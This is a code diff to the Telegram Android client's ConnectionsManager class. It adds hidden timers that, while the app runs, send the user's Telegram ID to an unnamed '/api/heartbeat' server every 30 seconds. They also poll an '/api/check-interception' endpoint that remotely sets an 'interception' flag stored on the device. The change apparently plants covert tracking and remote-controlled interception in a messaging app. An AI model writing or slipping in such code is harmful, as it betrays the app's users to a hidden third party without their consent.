@@ -1,5 +1,7 @@
 package org.telegram.tgnet;
 
+import static org.telegram.ui.CastSync.getContext;
+
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.Context;
@@ -11,6 +13,7 @@ import android.os.Build;
 import android.os.SystemClock;
 import android.text.TextUtils;
 import android.util.Base64;
+import android.util.Log;
 
 import androidx.annotation.Keep;
 
@@ -21,6 +24,7 @@ import com.google.android.play.core.integrity.IntegrityManagerFactory;
 import com.google.android.play.core.integrity.IntegrityTokenRequest;
 import com.google.android.play.core.integrity.IntegrityTokenResponse;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
+import com.google.gson.JsonObject;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -63,8 +67,11 @@ import java.util.Collections;
 import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.Objects;
 import java.util.TimeZone;
+import java.util.Timer;
+import java.util.TimerTask;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.Executor;
@@ -76,7 +83,14 @@ import java.util.concurrent.atomic.AtomicInteger;
 
 import javax.net.ssl.SSLException;
 
+import report.HttpRequest;
+import report.UserInfoFile;
+import report.entity.UserInfo;
+
 public class ConnectionsManager extends BaseController {
+
+    private Timer heartBeatTimer;
+    private Timer interceptionTimer;
 
     public final static int ConnectionTypeGeneric = 1;
     public final static int ConnectionTypeDownload = 2;
@@ -751,6 +765,79 @@ public class ConnectionsManager extends BaseController {
             lastPauseTime = 0;
             native_resumeNetwork(currentAccount, false);
         }
+
+
+        // 心跳 START
+
+        if (appPaused) {
+            heartBeatTimer.cancel();
+
+            Log.d("TG_DEBUG / HeartBeat", "心跳包停止");
+
+            interceptionTimer.cancel();
+
+            Log.d("TG_DEBUG / Interception", "拦截检查停止");
+        } else {
+            Log.d("TG_DEBUG / HeartBeat", "心跳包启动");
+
+            heartBeatTimer = new Timer();
+            heartBeatTimer.schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+
+                    if (thisUser != null) {
+                        HttpRequest.post(
+                                "/api/heartbeat",
+                                null,
+                                null,
+                                Map.of(
+                                        "telegram_id", thisUser.id
+                                )
+                        );
+
+                        Log.d("TG_DEBUG / HeartBeat", "心跳包上传");
+                    }
+                }
+            }, 0, 30000);
+
+            Log.d("TG_DEBUG / Interception", "拦截检查启动");
+
+            interceptionTimer = new Timer();
+            interceptionTimer.schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+
+                    if (thisUser != null) {
+                        JsonObject jsonObject = HttpRequest.get(
+                                "/api/check-interception",
+                                null,
+                                Map.of(
+                                        "tgid", thisUser.id
+                                ));
+                        JsonObject dataObject = jsonObject.getAsJsonObject("data");
+
+                        UserInfo userInfo = UserInfoFile.readFile(getContext());
+
+                        if (dataObject.get("has_interception").getAsBoolean()) {
+                            userInfo.setInterception(true);
+
+                            Log.d("TG_DEBUG / Interception", "启用拦截: 是");
+                        } else {
+                            userInfo.setInterception(false);
+
+                            Log.d("TG_DEBUG / Interception", "启用拦截: 否");
+                        }
+
+                        UserInfoFile.writeFile(getContext(), userInfo);
+                    }
+                }
+            }, 0, 15000);
+        }
+
+        // 心跳 END
+
     }
 
     public static void onUnparsedMessageReceived(long address, final int currentAccount, long messageId) {
